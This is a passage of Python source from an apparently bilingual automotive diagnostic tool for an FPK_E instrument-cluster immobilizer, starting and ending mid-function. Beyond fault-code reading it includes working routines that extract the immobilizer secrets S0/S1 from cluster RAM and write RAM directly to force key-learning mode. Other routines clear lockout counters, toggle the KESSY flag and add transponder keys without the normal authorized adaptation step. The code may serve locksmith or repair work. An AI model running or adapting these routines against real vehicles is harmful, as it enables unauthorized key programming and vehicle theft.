            preview = "; ".join(f"{d['display']} — {d['description']}" for d in dtcs[:2])
            if len(dtcs) > 2:
                preview += tr(f" и ещё {len(dtcs) - 2}", f" and {len(dtcs) - 2} more")
            msg = tr(
                f"Найдено ошибок: {len(dtcs)} (активных: {len(active_dtcs)}, в памяти: {len(stored_dtcs)}) — {preview}",
                f"Found {len(dtcs)} fault(s) ({len(active_dtcs)} active, {len(stored_dtcs)} stored) — {preview}",
            )
            reporter.info(
                tr(
                    f"Найдено ошибок: {len(dtcs)} (активных: {len(active_dtcs)}, сохранённых: {len(stored_dtcs)})",
                    f"Found {len(dtcs)} fault(s) ({len(active_dtcs)} active, {len(stored_dtcs)} stored)",
                )
            )
            for d in dtcs:
                state_lbl = tr("активна", "active") if d["active"] else tr("в памяти", "stored")
                reporter.info(f"  [{state_lbl}] {d['display']} — {d['description']}")
        else:
            msg = tr("Ошибок в памяти блока нет.", "No trouble codes stored in the unit.")
            reporter.info(msg)
        return {
            "procedure": proc_id,
            "ok": True,
            "summary": msg,
            "dtcs": dtcs,
            "active_count": len(active_dtcs),
            "stored_count": len(stored_dtcs),
            "untested_count": untested_count,
        }

    if proc_id == "clear_dtc":
        link.request_uds(b"\x14\xff\xff\xff", 0x54, timeout=3.0)
        msg = tr("Ошибки блока сброшены.", "Fault codes cleared.")
        reporter.success(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg}

    if proc_id == "key_poll":
        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        coil_id: str | None = None
        with contextlib.suppress(Exception):
            r_02e4 = link.request_uds(b"\x22\x02\xe4", 0x62, timeout=3.5)
            if len(r_02e4) >= 7:
                raw_id = r_02e4[3:7]
                if raw_id not in (b"\x00" * 4, b"\xff" * 4):
                    coil_id = raw_id.hex().upper()
        if coil_id:
            msg = tr(
                f"Штатная катушка: обнаружен транспондер ID {coil_id}.",
                f"Stock LF coil: transponder ID {coil_id} detected.",
            )
            reporter.info(msg)
            return {"procedure": proc_id, "ok": True, "summary": msg, "coil_key_id": coil_id, "raw": coil_id.lower()}

        r_start = b""
        r_res = b""
        with contextlib.suppress(Exception):
            r_start = link.request_uds(b"\x31\x01\x04\x3d\x00", 0x71, timeout=4.0)
            r_res = link.request_uds(b"\x31\x03\x04\x3d", 0x71, timeout=4.0)
        tail = r_res[4:] if len(r_res) > 4 else r_start[4:]
        if not tail or all(b == 0 for b in tail):
            msg = tr("Опрос считывателя ключей выполнен (транспондер не поднесён).", "Key reader polled (no transponder detected).")
        else:
            msg = tr(
                f"Опрос считывателя ключей выполнен (ответ: {tail.hex(' ').upper()}).",
                f"Key reader polled (response: {tail.hex(' ').upper()}).",
            )
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg, "coil_key_id": None, "raw": r_res.hex()}

    if proc_id == "prog_precond":
        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        r_pre = link.request_uds(b"\x31\x01\x02\x03", 0x71, timeout=3.0)
        tail = r_pre[4:]
        msg = (
            tr("Условия программирования выполнены (блокировок нет).", "Programming preconditions met (clear).")
            if not tail or all(b == 0 for b in tail)
            else tr(
                f"Есть ограничения условий программирования: {tail.hex(' ').upper()}",
                f"Programming precondition restrictions: {tail.hex(' ').upper()}",
            )
        )
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg, "raw": r_pre.hex()}

    if proc_id == "cp_activate":
        link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        link.request_uds(bytes.fromhex("2f034803ff000000"), 0x6F, timeout=3.0)
        msg = tr("Защита компонентов принудительно активирована.", "Component protection forced active.")
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg}

    if proc_id == "ecu_reset":
        link.request_uds(b"\x11\x02", 0x51, timeout=2.0)
        link.level8_active = False
        msg = tr("Команда отправлена — блок перезагружается.", "Reset command sent — unit is restarting.")
        reporter.info(msg)
        return {"procedure": proc_id, "ok": True, "summary": msg}

    raise ValueError(f"Unknown FPK_E procedure: {proc_id}")


# ────────────────────────────── Stock LF Coil Key Learning Procedures ──────────────────────────────


def fpke_coil_poll_transponder(
    link: FpkeCanLink,
    *,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Read live immobilizer state (`02ED`, `02EF`, `02E0`, `02EE`), coil transponder ID (`02E4`), and learned key IDs (`02E5..02EC`)."""
    from contitool.core.fpke import decode_fpke_02ed, decode_fpke_02ee

    link.start_keepalive()
    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    st_02ed = link.request_uds(b"\x22\x02\xed", 0x62, timeout=2.0)[3:]
    st_02ef = link.request_uds(b"\x22\x02\xef", 0x62, timeout=2.0)[3:]
    st_02e0 = link.request_uds(b"\x22\x02\xe0", 0x62, timeout=2.0)[3:]
    st_02ee: bytes | None = None
    with contextlib.suppress(Exception):
        st_02ee = link.request_uds(b"\x22\x02\xee", 0x62, timeout=1.5)[3:]

    d_02ed = decode_fpke_02ed(st_02ed)
    d_02ee = decode_fpke_02ee(st_02ee) if st_02ee else None
    mode_fam = int(d_02ed["life_state"])
    learned = int(d_02ed["learned_keys"])
    rem_keys = int(d_02ed["remaining_keys"])
    lock_mins = list(st_02ef[:6])

    coil_key_id: str | None = None
    coil_key_raw_hex: str | None = None
    with contextlib.suppress(Exception):
        r_02e4 = link.request_uds(b"\x22\x02\xe4", 0x62, timeout=3.5)
        if len(r_02e4) >= 7:
            id_bytes = r_02e4[3:7]
            if id_bytes not in (b"\x00" * 4, b"\xff" * 4):
                coil_key_id = id_bytes.hex().upper()
                coil_key_raw_hex = id_bytes[::-1].hex().upper()

    learned_key_ids: list[str] = []
    for k in range(min(8, max(0, learned))):
        did = 0x02E5 + k
        with contextlib.suppress(Exception):
            rk = link.request_uds(bytes([0x22, (did >> 8) & 0xFF, did & 0xFF]), 0x62, timeout=1.5)
            if len(rk) >= 7:
                learned_key_ids.append(rk[3:7].hex().upper())

    mode_txt = {
        1: tr("заводской (0)", "virgin (0)"),
        2: tr("рабочий (1–2)", "normal (1–2)"),
        3: tr("обучение ключей (3–5)", "key learning (3–5)"),
    }.get(mode_fam, tr(f"режим {mode_fam}", f"mode {mode_fam}"))
    coil_txt = (
        tr(f"чип в катушке: {coil_key_id}", f"chip in coil: {coil_key_id}")
        if coil_key_id
        else tr("чип в катушке не обнаружен", "no chip detected in coil")
    )
    msg = tr(
        f"Катушка LF: {coil_txt} • Режим: {mode_txt} • Обучено: {learned} (осталось: {rem_keys})",
        f"LF Coil: {coil_txt} • Mode: {mode_txt} • Learned: {learned} (remaining: {rem_keys})",
    )
    reporter.info(msg)
    return {
        "ok": True,
        "summary": msg,
        "coil_key_id": coil_key_id,
        "coil_key_raw_hex": coil_key_raw_hex,
        "learned_key_ids": learned_key_ids,
        "learned_keys": learned,
        "remaining_keys": rem_keys,
        "mode_family": mode_fam,
        "power_class": d_02ed["power_class"],
        "power_class_hex": d_02ed["power_class_hex"],
        "keyless_coded": d_02ed["keyless_coded"],
        "lockout_minutes": lock_mins,
        "challenge_r": st_02e0.hex().upper(),
        "slaves_02ee": d_02ee,
    }


def fpke_extract_live_s0_s1_from_coil(
    link: FpkeCanLink,
    *,
    expected_crc_a_le: bytes | str | None = None,
    expected_crc_b_le: bytes | str | None = None,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    poll_timeout: float = 4.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Extract live 32-byte `S0 || S1` (`Slot A / Slot B`) from cluster RAM when a working key is recognized by the coil.

    Checks SW 83A RAM (`0xFEDF2D44`, flag `0xFEDF2D79`, EEL 0x69 `0xFEDF1E2C`) and SW 1703 RAM (`0xFEDF5650`,
    flag `0xFEDF5685`, EEL 0x69 `0xFEDF4A58`), verifying `CRC-32(Slot A)` and `CRC-32(Slot B)` against `EEL 0x68`.
    """
    from contitool.core.fpke import fpke_verify_s0_s1

    link.start_keepalive()
    fpke_ensure_level8(link, frame_delay=frame_delay, wake_seconds=wake_seconds, reporter=reporter)

    # Trigger a quick coil read in 10 03 first so the LF reader is active, then switch back to 10 60 for 0x23
    coil_key_id: str | None = None
    with contextlib.suppress(Exception):
        link.request_uds(b"\x10\x03", 0x50, timeout=1.5)
        r_02e4 = link.request_uds(b"\x22\x02\xe4", 0x62, timeout=2.5)
        if len(r_02e4) >= 7 and r_02e4[3:7] not in (b"\x00" * 4, b"\xff" * 4):
            coil_key_id = r_02e4[3:7].hex().upper()
    link.request_uds(b"\x10\x60", 0x50, timeout=2.0)

    candidates: tuple[tuple[str, int, int | None, int | None, int | None], ...] = (
        ("SW 83A Slot RAM (0xFEDF2D44)", FPKE_83A_RAM_S0_ADDR, FPKE_83A_RAM_SLOTS_FLAG_ADDR, FPKE_83A_RAM_RECOG_STATE_ADDR, FPKE_83A_RAM_LAST_KEY_ID_ADDR),
        ("SW 83A EEL 0x69 RAM (0xFEDF1E2C)", FPKE_83A_RAM_EEL69_ADDR, None, None, None),
        ("SW 1703 Slot RAM (0xFEDF5650)", FPKE_1703_RAM_S0_ADDR, FPKE_1703_RAM_SLOTS_FLAG_ADDR, FPKE_1703_RAM_RECOG_STATE_ADDR, FPKE_1703_RAM_LAST_KEY_ID_ADDR),
        ("SW 1703 EEL 0x69 RAM (0xFEDF4A58)", FPKE_1703_RAM_EEL69_ADDR, None, None, None),
    )

    deadline = time.monotonic() + max(0.3, poll_timeout)
    last_recog_state: int | None = None
    last_slots_flag: int | None = None
    restored_kessy: tuple[int, int] | None = None
    attempt_idx = 0

    try:
        while True:
            reporter.check_cancelled()
            for src_label, s0_addr, flag_addr, recog_addr, id_addr in candidates:
                with contextlib.suppress(Exception):
                    raw_32 = fpke_read_memory_0x23(link, s0_addr, 32)
                    if len(raw_32) != 32:
                        continue
                    s0, s1 = raw_32[:16], raw_32[16:32]
                    fl_val: int | None = None
                    rc_val: int | None = None
                    if flag_addr is not None:
                        fl_val = fpke_read_memory_0x23(link, flag_addr, 1)[0]
                        last_slots_flag = fl_val
                    if recog_addr is not None:
                        rc_val = fpke_read_memory_0x23(link, recog_addr, 1)[0]
                        last_recog_state = rc_val
                    if id_addr is not None and not coil_key_id:
                        raw_kid = fpke_read_memory_0x23(link, id_addr, 4)
                        if raw_kid not in (b"\x00" * 4, b"\xff" * 4):
                            coil_key_id = raw_kid[::-1].hex().upper()

                    ver = fpke_verify_s0_s1(s0, s1, expected_crc_a_le, expected_crc_b_le)
                    if ver["valid"] and (expected_crc_a_le is not None or fl_val == 0x03 or flag_addr is None):
                        msg = tr(
                            f"Секрет S0/S1 считан из {src_label} и подтверждён по CRC-32 (A={ver['crc_a_le_hex']}, B={ver['crc_b_le_hex']}).",
                            f"Secret S0/S1 extracted from {src_label} and verified by CRC-32 (A={ver['crc_a_le_hex']}, B={ver['crc_b_le_hex']}).",
                        )
                        reporter.success(msg)
                        return {
                            "ok": True,
                            "summary": msg,
                            **ver,
                            "source": src_label,
                            "source_addr": f"0x{s0_addr:08X}",
                            "coil_key_id": coil_key_id,
                            "slots_flag": fl_val,
                            "recog_state": rc_val,
                        }

            # On a KESSY unit (0x5303 bit 7 = 0x80), temporarily enable the local LF coil in RAM while polling
            if attempt_idx == 0 and restored_kessy is None and poll_timeout >= 0.5 and time.monotonic() < deadline:
                _, r68_base, _ = _detect_fpke_nvm_ram_bases(link)
                with contextlib.suppress(Exception):
                    orig_5303 = fpke_read_memory_0x23(link, r68_base + 0x4B, 1)[0]
                    if orig_5303 not in (0xAA, 0xFF) and (orig_5303 & 0x80):
                        fpke_write_memory_0x3d(link, r68_base + 0x4B, bytes([orig_5303 & ~0x80]))
                        restored_kessy = (r68_base + 0x4B, orig_5303)

            attempt_idx += 1
            if time.monotonic() >= deadline:
                break
            time.sleep(0.35)
    finally:
        if restored_kessy is not None:
            with contextlib.suppress(Exception):
                link.request_uds(b"\x10\x60", 0x50, timeout=1.5)
                fpke_write_memory_0x3d(link, restored_kessy[0], bytes([restored_kessy[1]]))

    # Fallback: if expected CRC-32(A/B) are known, scan .secdata RAM (0xFEDF1D00..0xFEDF5A00) in 256-byte pages
    if expected_crc_a_le and expected_crc_b_le:
        for page_addr in range(0xFEDF1D00, 0xFEDF5A00, 0xE0):
            reporter.check_cancelled()
            with contextlib.suppress(Exception):
                chunk = fpke_read_memory_0x23(link, page_addr, 0x100)
                for off in range(0, len(chunk) - 32, 4):
                    s0, s1 = chunk[off : off + 16], chunk[off + 16 : off + 32]
                    ver = fpke_verify_s0_s1(s0, s1, expected_crc_a_le, expected_crc_b_le)
                    if ver["valid"]:
                        hit_addr = page_addr + off
                        src_label = f"RAM scan (0x{hit_addr:08X})"
                        msg = tr(
                            f"Секрет S0/S1 найден в {src_label} по совпадению CRC-32 A/B.",
                            f"Secret S0/S1 found in {src_label} via CRC-32 A/B match.",
                        )
                        reporter.success(msg)
                        return {
                            "ok": True,
                            "summary": msg,
                            **ver,
                            "source": src_label,
                            "source_addr": f"0x{hit_addr:08X}",
                            "coil_key_id": coil_key_id,
                            "slots_flag": last_slots_flag,
                            "recog_state": last_recog_state,
                        }

    raise RuntimeError(
        tr(
            f"Слоты A/B ещё не загружены в ОЗУ панели приборов (флаг слотов={last_slots_flag}, состояние={last_recog_state}). "
            "Приложите рабочий ключ (Ключ 1) к штатной катушке при включённом зажигании, подождите 1–2 с и повторите.",
            f"Slots A/B are not loaded in cluster RAM yet (slots_flag={last_slots_flag}, recog_state={last_recog_state}). "
            "Hold a working key (Key 1) against the stock LF coil with ignition ON, wait 1–2 s, and retry.",
        )
    )


def _detect_fpke_nvm_ram_bases(link: FpkeCanLink, kc_hex: str = "") -> tuple[int, int, int]:
    """Return `(r67_base, r68_base, r69_base)` in `.secdata` RAM for SW 83A vs SW 1703 / 1711."""
    kc_clean = "".join(kc_hex.split())
    if len(kc_clean) == 32:
        kc_bytes = bytes.fromhex(kc_clean)
        with contextlib.suppress(Exception):
            kc_83a = fpke_read_memory_0x23(link, FPKE_83A_RAM_EEL68_ADDR + 0x26, 16)
            if kc_83a == kc_bytes:
                return FPKE_83A_RAM_EEL67_ADDR, FPKE_83A_RAM_EEL68_ADDR, FPKE_83A_RAM_EEL69_ADDR
        with contextlib.suppress(Exception):
            kc_1703 = fpke_read_memory_0x23(link, FPKE_1703_RAM_EEL68_ADDR + 0x26, 16)
            if kc_1703 == kc_bytes:
                return FPKE_1703_RAM_EEL67_ADDR, FPKE_1703_RAM_EEL68_ADDR, FPKE_1703_RAM_EEL69_ADDR
    if getattr(link, "sw_profile", None) in ("1703", "1711"):
        return FPKE_1703_RAM_EEL67_ADDR, FPKE_1703_RAM_EEL68_ADDR, FPKE_1703_RAM_EEL69_ADDR
    with contextlib.suppress(Exception):
        mode_83a = fpke_read_memory_0x23(link, FPKE_83A_RAM_EEL68_ADDR + 0x49, 1)[0]
        if mode_83a <= 5:
            return FPKE_83A_RAM_EEL67_ADDR, FPKE_83A_RAM_EEL68_ADDR, FPKE_83A_RAM_EEL69_ADDR
    with contextlib.suppress(Exception):
        mode_1703 = fpke_read_memory_0x23(link, FPKE_1703_RAM_EEL68_ADDR + 0x49, 1)[0]
        if mode_1703 <= 5:
            return FPKE_1703_RAM_EEL67_ADDR, FPKE_1703_RAM_EEL68_ADDR, FPKE_1703_RAM_EEL69_ADDR
    return FPKE_83A_RAM_EEL67_ADDR, FPKE_83A_RAM_EEL68_ADDR, FPKE_83A_RAM_EEL69_ADDR


def fpke_prepare_additive_coil_learning(
    link: FpkeCanLink,
    *,
    s0_hex: str,
    s1_hex: str,
    kc_hex: str = "",
    allowed_keys: int = 3,
    existing_key_display_ids: list[str] | None = None,
    expected_crc_a_le: bytes | str | None = None,
    expected_crc_b_le: bytes | str | None = None,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Method A (non-destructive): enter LF coil key-addition mode (`mode = 5`) via `UDS 0x3D` RAM setup without `2E 02F7`.

    Writes `S0 || S1` into the `EEL 0x69` RAM mirror (`0xFEDF1E2C` on SW 83A / `0xFEDF4A58` on SW 1703), sets bit 0
    of `immo_flags` (`0x52FA.0 = 1`), keeps all existing learned key IDs in `EEL 0x67` (`0xFEDF29E8` / `0xFEDF5306`),
    raises `allowed_keys` (e.g. `learned + 1`), clears `key_over_can` bit 7 (`0x5303.7 = 0` for local LF coil while
    remembering any KESSY flag for `80 00` restoration), and switches `immo_mode = 5` (`0x5301 = 5`) so internal
    transition `k = 7` stays in `mode = 5` even if `learned < allowed`.
    """
    from contitool.core.fpke import fpke_verify_s0_s1

    s0 = bytes.fromhex("".join(s0_hex.split()))
    s1 = bytes.fromhex("".join(s1_hex.split()))
    ver = fpke_verify_s0_s1(s0, s1, expected_crc_a_le, expected_crc_b_le)
    if not ver["valid"]:
        raise RuntimeError(
            tr(
                f"Проверка S0/S1 не пройдена: CRC-32(A)={ver['crc_a_le_hex']} (ожидался {ver['expected_crc_a_le_hex']}), "
                f"CRC-32(B)={ver['crc_b_le_hex']} (ожидался {ver['expected_crc_b_le_hex']}). Подготовка режима дообучения заблокирована.",
                f"S0/S1 verification failed: CRC-32(A)={ver['crc_a_le_hex']} (expected {ver['expected_crc_a_le_hex']}), "
                f"CRC-32(B)={ver['crc_b_le_hex']} (expected {ver['expected_crc_b_le_hex']}). Refusing to enter additive mode.",
            )
        )

    link.start_keepalive()
    fpke_ensure_level8(link, frame_delay=frame_delay, wake_seconds=wake_seconds, reporter=reporter)

    # Read current live state via 02ED/02E5.. first
    pre_poll = fpke_coil_poll_transponder(link, reporter=reporter)
    cur_learned = int(pre_poll.get("learned_keys") or 0)
    live_ids = list(pre_poll.get("learned_key_ids") or [])
    if not live_ids and existing_key_display_ids:
        live_ids = [k.strip().upper() for k in existing_key_display_ids if k and k.strip().upper() != "FFFFFFFF"]
        if cur_learned == 0:
            cur_learned = len(live_ids)

    target_allowed = max(cur_learned + 1, min(8, int(allowed_keys)))
    if target_allowed > 8:
        raise RuntimeError(tr("Все 8 слотов ключей уже заняты.", "All 8 key slots are already full."))

    link.request_uds(b"\x10\x60", 0x50, timeout=2.0)

    r67_base, r68_base, r69_base = _detect_fpke_nvm_ram_bases(link, kc_hex)

    # Read current EEL 0x67 RAM mirror (37 bytes) and preserve existing learned key IDs
    r67_raw = bytearray(fpke_read_memory_0x23(link, r67_base, 37))
    if len(r67_raw) != 37 or r67_raw == bytearray(b"\xaa" * 37):
        r67_raw = bytearray(b"\xff" * 32 + bytes([target_allowed, cur_learned & 0x0F, 0, 0, 0]))
        for idx, disp_id in enumerate(live_ids[:cur_learned]):
            if len(disp_id) == 8:
                r67_raw[idx * 4 : (idx + 1) * 4] = bytes.fromhex(disp_id)[::-1]
    else:
        ram_learned = r67_raw[0x21] & 0x0F
        if 0 < ram_learned <= 8:
            cur_learned = ram_learned
            target_allowed = max(cur_learned + 1, min(8, int(allowed_keys)))
        # Ensure free slots [cur_learned..7] are 0xFFFFFFFF so 0x13DFA6 treats new blank key as unlearned
        for slot in range(cur_learned, 8):
            r67_raw[slot * 4 : (slot + 1) * 4] = b"\xff\xff\xff\xff"
        r67_raw[0x20] = target_allowed
        r67_raw[0x21] = (r67_raw[0x21] & 0xF0) | (cur_learned & 0x0F)

    # Read current EEL 0x68 flags/mode/key_over_can bytes at +0x42..+0x4B (10 bytes)
    r68_tail = bytearray(fpke_read_memory_0x23(link, r68_base + 0x42, 10))
    kessy_saved = False
    if len(r68_tail) != 10 or r68_tail == bytearray(b"\xaa" * 10):
        r68_tail = bytearray([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x01, 0x00])
        link._saved_coil_key_flags = None
    else:
        if r68_tail[0] == 0xFF:
            r68_tail[0] = 0x01
        else:
            r68_tail[0] |= 0x01  # 0x52FA bit 0 := 1 (S0/S1 present in 0x69)
        r68_tail[1:7] = b"\x00" * 6  # clear any lockout counters in RAM
        r68_tail[7] = 0x05           # 0x5301 := 5 (additive key learning mode 5; stays in 5 when learned < allowed)
        orig_5303 = r68_tail[9]
        if orig_5303 == 0xFF:
            r68_tail[9] = 0x00
            link._saved_coil_key_flags = None
        else:
            if orig_5303 & 0x80:
                link._saved_coil_key_flags = (r68_base + 0x4B, orig_5303)
                kessy_saved = True
            else:
                link._saved_coil_key_flags = None
            r68_tail[9] = orig_5303 & ~0x80  # 0x5303 bit 7 := 0 (local LF coil active during learning)

    # Write S0||S1 to EEL 0x69 RAM, updated EEL 0x67 RAM, and EEL 0x68 tail to RAM via 0x3D
    fpke_write_memory_0x3d(link, r69_base, s0 + s1)
    fpke_write_memory_0x3d(link, r67_base, bytes(r67_raw))
    fpke_write_memory_0x3d(link, r68_base + 0x42, bytes(r68_tail))

    poll = fpke_coil_poll_transponder(link, reporter=reporter)
    free_slots = max(0, target_allowed - cur_learned)
    msg = tr(
        f"Режим дообучения (режим 5, Способ А) активирован в ОЗУ без удаления старых ключей: "
        f"сохранено {cur_learned} кл., открыто для добавления: {free_slots} (разрешено: {target_allowed}). "
        "Приложите только новую болванку к катушке и нажмите «2. Обучить ключ в катушке (40 00)».",
        f"Additive learning mode (mode 5, Method A) activated in RAM without erasing old keys: "
        f"preserved {cur_learned} key(s), open for addition: {free_slots} (allowed: {target_allowed}). "
        "Place only the new blank key on the coil and click “2. Learn key in coil (40 00)”.",
    )
    reporter.success(msg)
    return {
        "ok": True,
        "method": "additive_ram_mode5",
        "immo_mode": 5,
        "kessy_preserved": kessy_saved,
        "summary": msg,
        "preserved_keys": cur_learned,
        "allowed_keys": target_allowed,
        "r67_ram_addr": f"0x{r67_base:08X}",
        "r68_ram_addr": f"0x{r68_base:08X}",
        "r69_ram_addr": f"0x{r69_base:08X}",
        "poll": poll,
    }


def fpke_start_coil_key_learning(
    link: FpkeCanLink,
    *,
    vin: str,
    s0_hex: str,
    s1_hex: str,
    kc_hex: str,
    power_class: int,
    allowed_keys: int,
    partner_mask: int = 0x01,
    key_flags: int = 0x00,
    status_5302: int = 0x00,
    expected_crc_a_le: bytes | str | None = None,
    expected_crc_b_le: bytes | str | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Step 1 of LF coil key learning: validate `S0/S1` CRC-32 and send `2E 02F7` to enter `mode 2` (`allowed_keys = N, learned = 0`)."""
    from contitool.core.fpke import build_fpke_02f7_payload, fpke_verify_s0_s1

    s0 = bytes.fromhex("".join(s0_hex.split()))
    s1 = bytes.fromhex("".join(s1_hex.split()))
    kc = bytes.fromhex("".join(kc_hex.split()))
    ver = fpke_verify_s0_s1(s0, s1, expected_crc_a_le, expected_crc_b_le)
    if not ver["valid"]:
        raise RuntimeError(
            tr(
                f"Проверка S0/S1 не пройдена: CRC-32(A)={ver['crc_a_le_hex']} (ожидался {ver['expected_crc_a_le_hex']}), "
                f"CRC-32(B)={ver['crc_b_le_hex']} (ожидался {ver['expected_crc_b_le_hex']}). Отправка 02F7 заблокирована.",
                f"S0/S1 verification failed: CRC-32(A)={ver['crc_a_le_hex']} (expected {ver['expected_crc_a_le_hex']}), "
                f"CRC-32(B)={ver['crc_b_le_hex']} (expected {ver['expected_crc_b_le_hex']}). Refusing to send 02F7.",
            )
        )

    link.start_keepalive()
    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    st_02ef = link.request_uds(b"\x22\x02\xef", 0x62, timeout=2.0)[3:]
    if st_02ef and st_02ef[0] > 0:
        raise RuntimeError(
            tr(
                f"Класс 0 (02E3/02F7) заблокирован таймером защиты: осталось {st_02ef[0]} мин.",
                f"Class 0 (02E3/02F7) lockout timer is active: {st_02ef[0]} min remaining.",
            )
        )

    if key_flags & 0x80:
        link._saved_coil_key_flags = (None, key_flags & 0xFF)
    else:
        link._saved_coil_key_flags = None
    req_02f7, _plain = build_fpke_02f7_payload(
        vin=vin,
        s0=s0,
        s1=s1,
        current_kc=kc,
        power_class=power_class,
        allowed_keys=allowed_keys,
        partner_mask=partner_mask,
        key_flags=key_flags,
        status_5302=status_5302,
        force_local_coil=True,
    )
    reporter.info(
        tr(
            f"Отправка пакета адаптации 2E 02F7 (87 Б, разрешено ключей: {allowed_keys}, катушка LF)…",
            f"Sending adaptation block 2E 02F7 (87 B, allowed keys: {allowed_keys}, LF coil)…",
        )
    )
    link.request_uds(req_02f7, 0x6E, timeout=8.0)
    poll = fpke_coil_poll_transponder(link, reporter=reporter)
    msg = tr(
        f"Режим обучения открыт (2E 02F7 принят): разрешено ключей {allowed_keys}, обучено {poll['learned_keys']}. "
        "По очереди прикладывайте ключи к катушке и нажимайте «Обучить ключ в катушке».",
        f"Learning session opened (2E 02F7 accepted): allowed {allowed_keys}, learned {poll['learned_keys']}. "
        "Place each key on the coil one by one and click “Learn key in coil”.",
    )
    reporter.success(msg)
    return {
        "ok": True,
        "summary": msg,
        "allowed_keys": allowed_keys,
        "poll": poll,
    }


def fpke_learn_next_key_on_coil(
    link: FpkeCanLink,
    *,
    param: int = 0x00,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Step 2 of LF coil key learning: send `2E 02E1 00 00 40 <param>` to program/register the transponder currently in the LF coil."""
    from contitool.core.fpke import build_fpke_02e1_request

    link.start_keepalive()
    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    req = build_fpke_02e1_request(0x40, param & 0xFF)
    reporter.info(
        tr(
            "Запуск обучения ключа на штатной катушке (2E 02E1 00 00 40 00) — держите ключ у катушки (~3–5 с)…",
            "Starting key learning on stock LF coil (2E 02E1 00 00 40 00) — hold key at the coil (~3–5 s)…",
        )
    )
    link.request_uds(req, 0x6E, timeout=12.0)
    poll = fpke_coil_poll_transponder(link, reporter=reporter)
    learned = poll["learned_keys"]
    rem = poll["remaining_keys"]
    ids_str = ", ".join(poll["learned_key_ids"]) if poll["learned_key_ids"] else (poll["coil_key_id"] or "—")
    msg = tr(
        f"Ключ успешно обучен через катушку! Обучено: {learned} (осталось: {rem}) • ID: {ids_str}",
        f"Key learned via LF coil! Learned: {learned} (remaining: {rem}) • ID: {ids_str}",
    )
    reporter.success(msg)
    return {
        "ok": True,
        "summary": msg,
        "learned_keys": learned,
        "remaining_keys": rem,
        "learned_key_ids": poll["learned_key_ids"],
        "coil_key_id": poll["coil_key_id"],
        "poll": poll,
    }


def fpke_finish_coil_key_learning(
    link: FpkeCanLink,
    *,
    sync_channel3: bool = False,
    restore_key_flags: int | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Step 3 of LF coil key learning: send `2E 02E1 00 00 80 00` (or `80 01`) to exit learning mode (`mode -> 1`) and erase `S0/S1`."""
    from contitool.core.fpke import build_fpke_02e1_request

    link.start_keepalive()

    # Restore KESSY key_over_can flag (0x5303 bit 7) in RAM before 80 00 flushes EEL 0x68 to DataFlash
    saved_pair = link._saved_coil_key_flags
    eff_restore_flags = restore_key_flags if restore_key_flags is not None else (saved_pair[1] if saved_pair else None)
    kessy_restored = False
    if eff_restore_flags is not None and (eff_restore_flags & 0x80):
        has_l8 = link.level8_active or fpke_check_level8(link) is not None
        if not has_l8 and not link.via_gateway:
            with contextlib.suppress(Exception):
                fpke_ensure_level8(link, wake_seconds=1.5, reporter=reporter)
                has_l8 = bool(link.level8_active or fpke_check_level8(link) is not None)
        if has_l8:
            with contextlib.suppress(Exception):
                link.request_uds(b"\x10\x60", 0x50, timeout=2.0)
                flag_addr = (
                    saved_pair[0]
                    if (saved_pair is not None and saved_pair[0] is not None)
                    else (_detect_fpke_nvm_ram_bases(link)[1] + 0x4B)
                )
                cur_b = fpke_read_memory_0x23(link, flag_addr, 1)[0]
                base_b = 0x00 if cur_b in (0xAA, 0xFF) else (cur_b & 0x3F)
                fpke_write_memory_0x3d(link, flag_addr, bytes([base_b | (eff_restore_flags & 0xC0)]))
                kessy_restored = True
    link._saved_coil_key_flags = None

    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    param = 0x01 if sync_channel3 else 0x00
    req = build_fpke_02e1_request(0x80, param)
    used_fallback_80_00 = False
    promoted_mode2 = False

    def _promote_mode2_if_needed(exc: Exception) -> bool:
        nonlocal promoted_mode2
        if promoted_mode2 or not isinstance(exc, UdsNegativeResponse) or exc.nrc not in (0x7F, 0x22):
            return False
        if not (link.level8_active or fpke_check_level8(link) is not None):
            return False
        with contextlib.suppress(Exception):
            link.request_uds(b"\x10\x60", 0x50, timeout=2.0)
            _, r68_base, _ = _detect_fpke_nvm_ram_bases(link)
            cur_mode = fpke_read_memory_0x23(link, r68_base + 0x49, 1)[0]
            if cur_mode in (2, 3):
                fpke_write_memory_0x3d(link, r68_base + 0x49, b"\x05")
                link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
                promoted_mode2 = True
                return True
            link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
        return False

    try:
        link.request_uds(req, 0x6E, timeout=20.0 if sync_channel3 else 8.0)
    except Exception as exc:
        if _promote_mode2_if_needed(exc):
            try:
                link.request_uds(req, 0x6E, timeout=20.0 if sync_channel3 else 8.0)
            except Exception:
                if not sync_channel3:
                    raise
                link.request_uds(build_fpke_02e1_request(0x80, 0x00), 0x6E, timeout=8.0)
                used_fallback_80_00 = True
        else:
            if not sync_channel3:
                raise
            reporter.info(
                tr(
                    "Узел 0x0E (BCM 09) не ответил по каналу 3 (работа на стенде) — завершение обучения командой 80 00…",
                    "Node 0x0E (BCM 09) did not answer on channel 3 (bench mode) — finishing with 80 00…",
                )
            )
            link.request_uds(build_fpke_02e1_request(0x80, 0x00), 0x6E, timeout=8.0)
            used_fallback_80_00 = True

    key_crc_hex: str | None = None
    with contextlib.suppress(Exception):
